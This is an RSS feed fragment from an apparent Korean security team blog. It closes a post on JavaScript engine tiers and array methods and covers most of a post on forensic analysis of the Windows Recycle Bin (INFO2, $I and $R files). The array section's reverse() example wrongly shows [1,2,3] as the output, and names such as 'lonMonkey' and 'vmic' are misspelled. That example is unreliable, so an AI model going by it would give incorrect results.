src="https://user-images.githubusercontent.com/43925259/66770764-5ad6c900-eef3-11e9-9323-3cb60652df38.png" alt="image"></p><h5 id="1-자바스크립트-소스-작성"><a href="#1-자바스크립트-소스-작성" class="headerlink" title="1. 자바스크립트 소스 작성"></a>1. 자바스크립트 소스 작성</h5><h5 id="2-파싱"><a href="#2-파싱" class="headerlink" title="2. 파싱"></a>2. 파싱</h5><h5 id="3-AST-생성"><a href="#3-AST-생성" class="headerlink" title="3. AST 생성"></a>3. <a href="https://ko.wikipedia.org/wiki/추상_구문_트리" target="_blank" rel="noopener">AST</a> 생성</h5><h5 id="4-인터프리터가-AST를-가지고-최적화-되지-않은-바이트-코드를-빠르게-생성"><a href="#4-인터프리터가-AST를-가지고-최적화-되지-않은-바이트-코드를-빠르게-생성" class="headerlink" title="4. 인터프리터가 AST를 가지고 최적화 되지 않은 바이트 코드를 빠르게 생성"></a>4. 인터프리터가 AST를 가지고 최적화 되지 않은 바이트 코드를 빠르게 생성</h5><h5 id="5-최적화-컴파일러에서-약간의-시간을-들여서-최적화된-기계어-코드-생성"><a href="#5-최적화-컴파일러에서-약간의-시간을-들여서-최적화된-기계어-코드-생성" class="headerlink" title="5. 최적화 컴파일러에서 약간의 시간을 들여서 최적화된 기계어 코드 생성"></a>5. 최적화 컴파일러에서 약간의 시간을 들여서 최적화된 기계어 코드 생성</h5><h5 id="6-만약-정확하지-않은-결과가-나왔다면-다시-바이트-코드로-변경-deoptimize"><a href="#6-만약-정확하지-않은-결과가-나왔다면-다시-바이트-코드로-변경-deoptimize" class="headerlink" title="6. 만약 정확하지 않은 결과가 나왔다면 다시 바이트 코드로 변경 (deoptimize)"></a>6. 만약 정확하지 않은 결과가 나왔다면 다시 바이트 코드로 변경 (deoptimize)</h5><hr><h3 id="인터프리터-컴파일러-동작과정"><a href="#인터프리터-컴파일러-동작과정" class="headerlink" title="인터프리터 / 컴파일러 동작과정"></a>인터프리터 / 컴파일러 동작과정</h3><p><img src="https://user-images.githubusercontent.com/43925259/66771227-98882180-eef4-11e9-9769-8b04257ab1c5.png" alt="image"></p><ul><li>자바스크립트 엔진마다 동작 과정에 차이가 있지만 위 과정은 공통이다.</li></ul><h5 id="V8-동작-과정"><a href="#V8-동작-과정" class="headerlink" title="V8 동작 과정"></a>V8 동작 과정</h5><p><img src="https://user-images.githubusercontent.com/43925259/66771378-0df3f200-eef5-11e9-9096-c0910b243a8e.png" alt="image"></p><ul><li>그림 자체는 공통 그림과 별 차이가 없는데, 네이밍을 자동차 엔진처럼 해놨다.</li><li><code>인터프린터</code>는 <code>Ignition</code>이라고 부르며, <code>최적화 컴파일러</code>는 <code>TurboFan</code>이라고 부른다.</li></ul><ul><li><strong>Ignition의 역할</strong><br>-&gt; 코드를 점화하여 바이트 코드를 생성 및 실행<br>-&gt; 프로파일링 데이터를 수집<br>-&gt; 특정 함수가 자주 호출되서 뜨거워졌다면 바이트 코드 및 프로파일링 데이터를 <code>TurboFan</code>으로 전송</li><li><strong>TurboFan의 역할</strong><br>-&gt; 프로파일링 된 데이터를 기반으로 매우 최적화된 기계어 코드를 생성 (뜨거워진 함수를 식혀줌)<br>-&gt; 최적화가 실패하면 다시 바이트 코드로 변경</li></ul><h5 id="SpiderMonkey-동작-과정"><a href="#SpiderMonkey-동작-과정" class="headerlink" title="SpiderMonkey 동작 과정"></a>SpiderMonkey 동작 과정</h5><p><img src="https://user-images.githubusercontent.com/43925259/66771393-1a784a80-eef5-11e9-8392-a0441b6b4477.png" alt="image"></p><ul><li>스파이더 몽키는 최적화 컴파일러가 2개가 존재한다.</li></ul><ul><li><strong>인터프리터 역할</strong><br>-&gt; 최적화 되지 않은 바이트 코드 생성</li><li><strong>Baseline 역할</strong><br>-&gt; 약간 최적화된 코드 생성<br>-&gt; 프로파일링 데이터 수집</li><li><strong>lonMonkey 역할</strong><br>-&gt; 고도로 최적화된 코드 생성<br>-&gt; 최적화에 실패하면 Baseline 코드로 변경</li></ul><h5 id="Chakra-Core-동작-과정"><a href="#Chakra-Core-동작-과정" class="headerlink" title="Chakra Core 동작 과정"></a>Chakra Core 동작 과정</h5><p><img src="https://user-images.githubusercontent.com/43925259/66771404-2532df80-eef5-11e9-827e-e799e26e9779.png" alt="image"></p><ul><li>차크라 코어도 2개의 최적화 컴파일러가 존재한다.</li><li>스파이더 몽키와 유사한 과정이다.</li></ul><ul><li><strong>인터프리터 역할</strong><br>-&gt; 최적화 되지 않은 바이트 코드 생성</li><li><strong>Simple JIT 역할</strong><br>-&gt; 약간 최적화된 코드 생성</li><li><strong>FullJIT 역할</strong><br>-&gt; 고도로 최적화된 코드 생성<br>-&gt; 최적화에 실패하면 바이트 코드로 변경</li></ul><h5 id="JavaScript-Core-동작-과정"><a href="#JavaScript-Core-동작-과정" class="headerlink" title="JavaScript Core 동작 과정"></a>JavaScript Core 동작 과정</h5><p><img src="https://user-images.githubusercontent.com/43925259/66771440-34199200-eef5-11e9-81da-967df7ee7616.png" alt="image"></p><ul><li>자바스크립트 코어는 세 가지의 최적화 컴파일러를 사용한다.</li></ul><ul><li><strong>LLInt 역할</strong> (Low-Level Interpreter)<br>-&gt; 최적화 되지 않은 바이트 코드 생성</li><li><strong>Baseline 역할</strong><br>-&gt; 약간 최적화된 코드 생성</li><li><strong>DFG 역할</strong> (Data Flow Graph)<br>-&gt; 조금 더 최적화된 코드 생성<br>-&gt; 최적화에 실패하면 약간 최적화된 코드로 변경</li><li><strong>FTL 역할</strong> (Faster Than Light)<br>-&gt; 고도로 최적화된 코드 생성<br>-&gt; 최적화에 실패하면 약간 최적화된 코드로 변경</li></ul><hr><h3 id="JS-Array"><a href="#JS-Array" class="headerlink" title="JS Array"></a>JS Array</h3><h5 id="Array-특징"><a href="#Array-특징" class="headerlink" title="Array 특징"></a>Array 특징</h5><ol><li><span style="color:red">인덱스</span>가 존재<br>-&gt; 제한된 범위가 있는 정수<br>-&gt; 배열은 <script type="math/tex">2^{32}</script>-1개 까지의 요소를 가질 수 있다.<br>-&gt; 즉 0부터 <script type="math/tex">2^{32}</script>-2 까지의 범위만 유효한 인덱스 값이다.</li><li><span style="color:red">길이 정보</span>가 존재<br>-&gt; 배열에 요소가 추가될 경우 <code>length property</code>가 증가</li></ol><h5 id="Array-함수"><a href="#Array-함수" class="headerlink" title="Array 함수"></a>Array 함수</h5><ul><li><p><code>pop</code><br>-&gt; 배열 뒷 부분 값을 삭제 </p>  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">arr.pop()</span><br><span class="line"># arr: [1]</span><br></pre></td></tr></table></figure></li><li><p><code>push</code><br>-&gt; 배열 뒷 부분에 값을 삽입</p>  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">arr.push(<span class="number">3</span>)</span><br><span class="line"># arr: [1, 2, 3]</span><br></pre></td></tr></table></figure></li><li><p><code>shift</code><br>-&gt; 배열 앞 부분 값 삭제</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">arr.shift();</span><br><span class="line">#arr: [2, 3]</span><br></pre></td></tr></table></figure></li><li><p><code>unshift</code><br>-&gt; 배열 앞 부분에 값 삽입</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">arr.unshift( <span class="number">0</span> );</span><br><span class="line"># [0, 1, 2, 3]</span><br></pre></td></tr></table></figure></li><li><p><code>concat</code><br>-&gt; 다수의 배열을 합치고 병합한 배열의 사본 반환</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = [ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> ];</span><br><span class="line"><span class="keyword">var</span> arr2 = [ <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span> ];</span><br><span class="line"><span class="keyword">var</span> arr3 = arr2.concat( arr1 );</span><br><span class="line"># [4, 5, 6, 1, 2, 3 ]</span><br></pre></td></tr></table></figure></li><li><p><code>reverse</code><br>-&gt; 배열의 요소 순서를 거꾸로 변경</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr =[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">arr.reverse()</span><br><span class="line"># [1,2,3]</span><br></pre></td></tr></table></figure></li><li><p><code>toString</code><br>-&gt; 배열 요소를 하나의 문자열로 합친다.<br>-&gt; join 함수에 인자 안주고 실행하는 것과 결과 동일</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">arr.toString(); </span><br><span class="line"># 1,2,3</span><br></pre></td></tr></table></figure></li><li><p><code>join</code><br>-&gt; 배열 요소 전부를 하나의 문자열로 합친다.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">arr.join(); </span><br><span class="line"># 1,2,3</span><br><span class="line"></span><br><span class="line">arr.join(<span class="string">'@'</span>)</span><br><span class="line"># 1@2@3</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h3><p><a href="https://velog.io/@godori/JavaScript-engine-1" target="_blank" rel="noopener">https://velog.io/@godori/JavaScript-engine-1</a></p><p><a href="https://velog.io/@godori/JavaScript-엔진-톺아보기-2-pujpqum2ji" target="_blank" rel="noopener">https://velog.io/@godori/JavaScript-%EC%97%94%EC%A7%84-%ED%86%BA%EC%95%84%EB%B3%B4%EA%B8%B0-2-pujpqum2ji</a></p><p><a href="https://mathiasbynens.be/notes/shapes-ics" target="_blank" rel="noopener">https://mathiasbynens.be/notes/shapes-ics</a></p><p><a href="http://blog.302chanwoo.com/2017/08/javascript-array-method/" target="_blank" rel="noopener">http://blog.302chanwoo.com/2017/08/javascript-array-method/</a></p><hr><h3 id="문서-역사"><a href="#문서-역사" class="headerlink" title="문서 역사"></a>문서 역사</h3><p><code>2019-10-15</code> <strong>JSec: 최초 작성</strong></p><hr><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/10/15/Pwn/%E3%84%B4%20Research/JSE_%EA%B8%B0%EB%B3%B8_%EA%B0%9C%EB%85%90/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Forensics_Analysis_of_Recycle_Bin</title>
      <link>https://defenit.kr/2019/10/14/Forensic/%E3%84%B4%20Research/Forensics_Analysis_of_Recycle_Bin/</link>
      <guid>https://defenit.kr/2019/10/14/Forensic/%E3%84%B4%20Research/Forensics_Analysis_of_Recycle_Bin/</guid>
      <pubDate>Sun, 13 Oct 2019 17:04:50 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;목차&quot;&gt;&lt;a href=&quot;#목차&quot; class=&quot;headerlink&quot; title=&quot;목차&quot;&gt;&lt;/a&gt;목차&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;휴지통 분석의 개요(Recycle Bin)&lt;/li&gt;
&lt;li&gt;휴지통이란?&lt;/li&gt;
&lt;li&gt;휴지통 분석(Recycle.
        
      
      </description>
      
      <content:encoded><![CDATA[<h3 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h3><ul><li>휴지통 분석의 개요(Recycle Bin)</li><li>휴지통이란?</li><li>휴지통 분석(Recycle.Bin)<ul><li>Windows XP 휴지통 분석<ul><li>C:\RECYCLER\\{USER SID} 폴더 찾기</li><li>Windows XP에서의 INFO2 file 과 저장되는 파일 이름</li><li>INFO2 FILE Structure Analysis</li></ul></li><li>Windows 10 휴지통 분석<ul><li>C:\$Recycle.Bin\\{USER SID} 폴더 찾기</li><li>Windows 10에서의 <h7>$I</h7> 와 $R Analysis</li><li>$I FILE Structure</li><li>$R FILE Structure</li></ul></li></ul></li><li>DFC(Digital Forensic Challenge) 2019 Incident Response 100 문제 일부 풀이.</li><li>추후 개선 해야 할 점.</li></ul><p><hr></p><h4 id="휴지통-분석의-개요-Recycle-Bin"><a href="#휴지통-분석의-개요-Recycle-Bin" class="headerlink" title="휴지통 분석의 개요(Recycle Bin)"></a><u>휴지통 분석의 개요(Recycle Bin)</u></h4><p><img src="https://user-images.githubusercontent.com/44820723/66715514-37caed00-edff-11e9-9814-1bf1451f5bab.png" alt="휴지통 이미지"></p><p>우리가 자주 사용하는 윈도우에서 없어서는 안되는 프로그램중 하나인 <strong>휴지통</strong> 에 대해서 분석을 해보려고 합니다.</p><p>중요한 데이터를 삭제 해서 복구를 요청하는 경우도 있고 윈도우 사용자라면 누구나 한번 쯤은 휴지통을 사용해 보고 기능도 잘알지만 휴지통의 원리를 아는 사람은 몇 없을 것이라고 생각해서 글을 한번 써보려고 합니다. </p><p><hr></p><h4 id="휴지통이란"><a href="#휴지통이란" class="headerlink" title="휴지통이란?"></a><u>휴지통이란?</u></h4><p>Windows 데스크톱에 있는 휴지통 프로그램은 파일을 삭제했을때 임시로 저장되는 디렉터리를 가르킵니다.</p><p>우리가 Microsoft Windows 운영체제에서 파일을 삭제되면 우리 눈으로는 완전히 삭제 된 것 처럼 보이지만 영구적으로 휴지통에서 삭제 되는 것이 아닙니다.</p><p>휴지통에서 완전히 삭제 되는 것이 아니기 때문에 사용자가 휴지통에서 삭제된 파일을 복원 하려는 경우에 휴지통 포렌식(Recycle Bin Forensic)을 수행 할 수 있습니다.</p><p>디지털 포렌식(Digital Forensic)을 수행하는 궁극적인 이유는 사건에 필요한 자료를 찾기 위함이 1순위로 생각이 되는데 운영체제에서 가장 많이 데이터가 오가는 곳이 휴지통이라고 생각을 합니다.</p><p>그래서  포렌식(Forensic) 즉, 법의학 관점에서 보았을때 휴지통은 증거 및 단서를 수집하는데에 있어서 금광이라고 불릴 정도로 많은 데이터가 존재 하고, 정확한 분석을 하면 유용한 데이터를 복구 할 수 있습니다.</p><p><hr></p><h4 id="휴지통-분석-Recycle-Bin"><a href="#휴지통-분석-Recycle-Bin" class="headerlink" title="휴지통 분석(Recycle.Bin)"></a><u>휴지통 분석(Recycle.Bin)</u></h4><p>앞서 이야기 했듯이 휴지통은 Windows desktop에서 가장 눈여겨 보는 <strong>아티팩트(artifacts)</strong>중에 하나입니다.</p><p>Microsoft Windows 버전을 보면 지금까지 많은 버전들이 변화 하고 바뀌면서 Windows 10 까지 나왔습니다.</p><p>휴지통 프로그램은 Windows 95를 시작으로 Windows 운영체제와 함께 쭉 계속해서 사용해 왔으며 MS-DOS에서도 유사한 기능의 프로그램이 있었습니다.</p><p>컴퓨터 사용자가 Windows에서 파일을 ‘삭제’할때 사용자 눈에는 완벽하게 삭제된 것 처럼 보이지만 컴퓨터에는 해당 파일에 대한 데이터가 남아있습니다. 파일이 삭제된 시점에 파일은 휴지통의 시스템 폴더에 복사가 자동으로 되면서 사용자가 해당 파일로 어떠한 행위를 하기 전까지는 시스템 폴더에 저장됩니다.</p><p>아래의 표는 사용하는 OS(Operating System)에 따른 파일시스템 및 삭제된 파일 경로 등등을 작성한 표입니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66715532-6ea10300-edff-11e9-8446-34217e99cef0.png" alt="각 OS에 따른 Recycle.bin 위치"></p><p><hr></p><h5 id="Windows-XP-휴지통-분석"><a href="#Windows-XP-휴지통-분석" class="headerlink" title="Windows XP 휴지통 분석"></a><u>Windows XP 휴지통 분석</u></h5><h6 id="C-RECYCLER-USER-SID-폴더-찾기"><a href="#C-RECYCLER-USER-SID-폴더-찾기" class="headerlink" title="C:\RECYCLER\\{USER SID} 폴더 찾기"></a><u>C:\RECYCLER\\{USER SID} 폴더 찾기</u></h6><p>아래의 사진은 Windows XP에서 휴지통 폴더(RECYCLER)의 내용을 확인 한 것 입니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66715538-94c6a300-edff-11e9-846e-b798c0357a4b.png" alt="win_xp recycler"></p><p>RECYCLER 폴더 아래에 <user sid>가 있습니다.</user></p><p>USER SID를 확인하는 방법은 레지스트리 키를 확인해 보는 것 입니다.</p><ol><li><p><code>win+r</code> 을 입력후 <code>regedit</code> 를 입력후 \HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList 에 있습니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66715559-c0498d80-edff-11e9-9c03-7c8ee039dc4a.png" alt="registry ProfileList"></p></li><li><p><code>cmd</code>를 실행 시키고 <code>vmic UserAccount Where LocalAccount=True Get SID</code> 명령을 입력하면 아래와 같이 SID를 확인 할 수 있습니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66715575-de16f280-edff-11e9-98b7-f5bb0009f0d1.png" alt="win_xp SID"></p></li></ol><p>그렇다면 이제 직접 해당 디렉터리에 가서 데이터가 있는지 확인해 보겠습니다.</p><p>이제 c:\ 하위에 RECYCLER 폴더를 확인하기 위해서는 폴더 옵션을 좀 확인 해야합니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66715581-f0912c00-edff-11e9-9ddc-52440513c107.png" alt="폴더 옵션"></p><p>위와 같이 <code>보호된 운영체제 파일 숨기기(권장)</code>을 체크 해제를 하고 <code>숨김 파일 및 폴더 표시</code>를 체크 하면 아래와 같이 폴더를 확인 할 수 있습니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66715597-27ffd880-ee00-11e9-86da-e1d90974c32a.png" alt="View RECYCLER1"></p><p>해당 폴더에 들어가 보면 아래와 같이 <user sid> 값을 이름으로 하고있는 휴지통을 확인 할 수 있습니다.</user></p><p>해당 시스템에는 1개의 User를 사용하기 때문에 휴지통이 1개밖에 없습니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66715603-3c43d580-ee00-11e9-8afe-700095b95461.png" alt="View RECYCLER2"></p><p><user sid>를 이름으로 하고있는 파일로 들어가 보면 다음과 같이 삭제 되었던 파일이 존재 합니다.</user></p><p><img src="https://user-images.githubusercontent.com/44820723/66715613-4e257880-ee00-11e9-9354-224d3866e656.png" alt="DATA"></p><p>하지만 명령어 창을 통해서 해당 폴더의 내용을 확인하면 내용이 다르게 보입니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66715622-60071b80-ee00-11e9-8b9f-0f1eebacbfb8.png" alt="View Data file"></p><p><hr></p><h6 id="Windows-XP에서의-INFO2-file과-저장되는-파일-이름"><a href="#Windows-XP에서의-INFO2-file과-저장되는-파일-이름" class="headerlink" title="Windows XP에서의 INFO2 file과 저장되는 파일 이름"></a><u>Windows XP에서의 INFO2 file과 저장되는 파일 이름</u></h6><p>그 이유는 폴더에서 확인한 데이터는 INFO2 파일의 정보에 있는 데이터를 기반으로 원래 파일이름으로 표시를 해주기 때문에 명령어 창으로 데이터를 확인하면 위와 같이 Dc3.txt 라는 데이터를 확인할 수 있습니다.</p><p>명령어 창으로 확인되는 파일 이름 및 확장자는 다음의 형식에 따릅니다.</p><p><code>D [original drive letter of file] [index number].[original file extension]</code>의 형식을 가집니다.</p><p>위의 파일은 지워졌고[D], C드라이브에 있던 데이터[c] 이면서 확장자는 txt[txt] 이기 때문에 그렇습니다.</p><p>만약 데이터가 D드라이브에서 삭제가 되었다면 Dd[index].[extension] 의 파일명으로 존재 할 것입니다.</p><p>index의 값은 삭제된 파일이 늘어나면 늘어날 수록 값이 늘어납니다.</p><p>저기 보이는 INFO2 라는 파일 때문에 폴더에서 파일을 보면 정확한 원본 파일명이 나왔었는데요!</p><p>저 파일은 Windows Vista 이전의 운영체제 에서만 확인 할 수 있습니다.</p><p>해당 파일은 쉽게 열수가 없고 눈으로 볼 수 없는 파일 입니다. </p><p>그래서 rifiuti2.exe 프로그램을 사용합니다.</p><p><code>rifiuti2.exe install URL : https://github.com/abelcheung/rifiuti2/releases/tag/0.7.0</code></p><p>rifiuti2.exe 사용법은 아래와 같습니다.</p><p><code>rifiuti2.exe [INFO2]</code>이지만 저는 명령어 창에 <code>rifiuti.exe INFO2 &gt; result.txt</code>라고 입력했습니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66716693-a44be900-ee0b-11e9-8ae4-56188f6223ec.png" alt="rifiuti2.exe result1"></p><p>위와 같이 지금까지 삭제된 데이터가 다 들어있습니다. (분명 data.txt 만 있었는데 말이죠)</p><p>rifiuti2.exe 를 이용하면 <code>[삭제된 파일의 IDX 값] [삭제된 날짜] [Gone? 값] [사이즈] [파일의 경로]</code> 를 확인 할 수 있는데, 사이즈의 값이 전부 4096 으로 되어 있습니다. txt 파일과 pptx 파일의 사이즈가 4096으로 통일될 가능성은 거의 없는데 말이지요.</p><p>그 이유는 4096보다 작은 사이즈면 기본값으로 4096이라고 표시 되는 것 같습니다. </p><p><img src="https://user-images.githubusercontent.com/44820723/66716698-b9287c80-ee0b-11e9-949b-3278fdd31b15.png" alt="rifiuti2.exe result2"></p><p>확인차 사이즈가 큰파일을 삭제해 봤는데 위와 같이 2871296 이라고 나왔습니다.</p><p>그리고 알수 없는 Gone? 라는 값이 있습니다. Yes / No 를 반환 하는 값으로 생각이 되는데 RECYCLER 하위에 있는 SID의 파일명을 가진 휴지통에서 파일을 완전 삭제를 했는가 아니면 완전 삭제 하지 않고 아직 휴지통 안에 있는지를 확인하는 반환 값 인것 같습니다.</p><p>aaa.txt 파일과 powerpoint.pptx 는 아예 휴지통에서 삭제를 해서 없는 상태인데 YES 반환 해 놓은 것 을 보면 알 수 있습니다.</p><p><hr></p><h6 id="INFO2-FILE-Structure-Analysis"><a href="#INFO2-FILE-Structure-Analysis" class="headerlink" title="INFO2 FILE Structure Analysis"></a><u>INFO2 FILE Structure Analysis</u></h6><p>이렇게 INFO2를 rifiuti2.exe tool을 이용해서 쉽게 확인 할 수 있었습니다.</p><p>이번에는 직접 HxD를 이용해서 INFO2 File Structure를 공부해 보겠습니다. 참고로 INFO2 파일은 눈으로 볼수가 없고 cmd 명령어 창에 <code>dir /a</code>명령을 통해서만 확인 할 수 있습니다.</p><p>그래서 필자 같은 경우에는 <code>C:\RECYCLER\{USER SID}</code>폴더 자체를 localhost 컴퓨터에 옮겨서 FTK Imager tool을 이용해서 INFO2 파일을 추출 했습니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66716724-1cb2aa00-ee0c-11e9-8637-9ea4481f354a.png" alt="INFO2 data"></p><p>INFO2 파일을 HxD에 넣어보면 아래와 같습니다.</p><p>[글을 작성하기 위해서 실습하던중 여러 데이터가 들어가서 INFO2 파일에서 불필요한 요소는 삭제를 했습니다.  레코드 번호나 다른 데이터 들의 순서가 다를 수도 있습니다.]</p><p><img src="https://user-images.githubusercontent.com/44820723/66716731-2f2ce380-ee0c-11e9-9fbd-2b29b790b4f7.png" alt="INFO2 data in HxD"></p><p>위와 같이 Hex Value 값만을 보고 파일 구조를 바로 이해하기 어렵기 때문에 INFO2 FILE Structure 를 정리한 표를 작성해 보겠습니다. </p><p>INFO2 FILE Structure</p><p>파일의 헤더 + 파일 레코드로 구성되어 있으며, 파일의 헤더는 0~F(15) 까지 나타나 있고 그후 파일레코드의 반복으로 INFO2 파일이 만들어 집니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66716750-6bf8da80-ee0c-11e9-84b3-3725f51f5dae.png" alt="info2 file structure"></p><p>NT/2K/XP - INFO2 FILE Structure</p><p><img src="https://user-images.githubusercontent.com/44820723/66716757-7c10ba00-ee0c-11e9-8bbe-97255ab7dece.png" alt="세부적인 INFO2 FILE Structure"></p><p>위의 구조에 맞춰서 INFO2 FILE과 대조 해보겠습니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66716764-95196b00-ee0c-11e9-83ca-e497758da509.png" alt="INFO2 FILE 대조"></p><p>위와 같은 데이터 파일 구조를 바탕으로 rifiufi2.exe tool이 파일 정보를 추출해서 시각적으로 보기 쉽게 만들어 주는것 같습니다. </p><p>휴지통을 깨끗하게 비우고 INFO2 FILE을 보면 아래와 같습니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66716770-a793a480-ee0c-11e9-8dcd-e7a9ccdab7b4.png" alt="휴지통 비우기 후 HxD"></p><p>Header 만을 남겨두고 파일 레코드가 깨끗하게 사라지게 됩니다.</p><p><hr></p><h5 id="Windows-10-휴지통-분석"><a href="#Windows-10-휴지통-분석" class="headerlink" title="Windows 10 휴지통 분석"></a><u>Windows 10 휴지통 분석</u></h5><h6 id="C-Recycle-Bin-USER-SID-폴더-찾기"><a href="#C-Recycle-Bin-USER-SID-폴더-찾기" class="headerlink" title="C:\$Recycle.Bin\\{USER SID} 폴더 찾기"></a><u>C:\$Recycle.Bin\\{USER SID} 폴더 찾기</u></h6><p>Windows XP 처럼 폴더를 찾아 보겠습니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66716779-c003bf00-ee0c-11e9-85a1-0d6072def2d6.png" alt="Windows10 Recycle.bin1"></p><p>휴지통이라는 이름을 가지고 있네요</p><p><img src="https://user-images.githubusercontent.com/44820723/66716786-d6aa1600-ee0c-11e9-881e-3a33acec24e1.png" alt="Windows10 Recycle.bin2"></p><p>폴더에서는 휴지통으로 사용자에게 보이지만 명령어 창에는 S-1-5-21-165820823-1628512024-356916387-1001  라고 <user sid> 값이 출력됩니다.</user></p><p><user sid> 폴더 하위를 보면 폴더에서는 같지만 XP와는 다른 파일이 명령어 창에서 존재 합니다.</user></p><p><img src="https://user-images.githubusercontent.com/44820723/66716827-51733100-ee0d-11e9-8c0e-76b397726dc5.png" alt="휴지통 내용물"></p><p>↑↑ 폴더에서 본 $Recycle.Bin\\{USER SID}</p><p><img src="https://user-images.githubusercontent.com/44820723/66716836-6fd92c80-ee0d-11e9-9769-840f2c70c720.png" alt="Recycle.bin에 숨긴 파일로 존재하는 파일들"></p><p>↑↑ 명령어창에서 본 $Recycle.Bin\\{USER SID}</p><p><hr></p><h6 id="Windows-10에서의-I-와-R-FILE-Analysis"><a href="#Windows-10에서의-I-와-R-FILE-Analysis" class="headerlink" title="Windows 10에서의 $I 와 $R FILE Analysis"></a><u>Windows 10에서의 <h7>$I</h7> 와 $R FILE Analysis</u></h6><p>Windows XP 와 달리 <h7>$I</h7> 와 $R 의 이름이 붙은 파일이 보이고 INFO2 FILE이 보이지 않습니다.</p><p>Windows Vista 이후에서는 INFO2 FILE 대신에 $I 파일로 대체 되었습니다.</p><p><h7>$I</h7>로 시작하는 파일은 본질 적으로 삭제된 특정 파일의 메타 데이터를 담은 데이터 입니다. Windows XP의 INFO2 FILE과는 달리 $I 파일은 고정 크기의 파일이 아닌 필요한 만큼만 할당 되어져 있습니다.</p><p>$R로 시작하는 파일은 실제로 삭제된 원본 파일을 의미 합니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66716865-b038aa80-ee0d-11e9-96ec-44ad60668492.png" alt="$R로 시작하는 파일"></p><p>FILE Size 만봐도 원본 파일인것 을 알 수 있습니다.</p><p>파일을 삭제하면 <h7>$R</h7>파일은 $R[random string] 파일 형식으로 이름이 변경됩니다.</p><p>또한 $I파일은 <h7>$I</h7>[$R의 random string]의 형식으로 변경하게 됩니다.</p><p><hr></p><h6 id="I-FILE-Structure"><a href="#I-FILE-Structure" class="headerlink" title="$I FILE Structure"></a><u>$I FILE Structure</u></h6><p><img src="https://user-images.githubusercontent.com/44820723/66716869-bcbd0300-ee0d-11e9-8cf9-40f1f8e165c6.png" alt="$I FILE Structure"></p><p>$I FILE Structure를 알아보겠습니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66716879-e118df80-ee0d-11e9-8c4f-f2bfa7ca9030.png" alt="$I 파일 구조 표"></p><p>위의 구조를 바탕으로 적용을 해보면 다음과 같습니다.</p><p><img src="https://user-images.githubusercontent.com/44820723/66716885-eece6500-ee0d-11e9-90ae-ece8362c3530.png" alt="$I 파일 대조"></p><p>Windows XP 의 INFO2 FILE의 필요한것만 모아 놓은 축소판 인것 같습니다.</p><p>File Header의 Hex Value 값은 Windows 7 or Windows 8.1 일 경우엔 1, Windows 10 일경우엔 2를 의미합니다. </p><p>File Deleted Date/Time 은 TimeDecode Tool 을 이용해서 변환할 수 있습니다.</p><p><hr></p><h6 id="R-FILE-Structure"><a href="#R-FILE-Structure" class="headerlink" title="$R FILE Structure"></a><u>$R FILE Structure</u></h6><p><h7>$I</h7> 파일과 달리 $R 파일은 기존의 사용자가 삭제한 데이터를 그대로 보존하고 있습니다.</p><p>바뀐점은 파일 이름만 조금 바뀐것 뿐입니다. 실제 파일의 내용과 바뀐점이 없습니다.</p><p><img 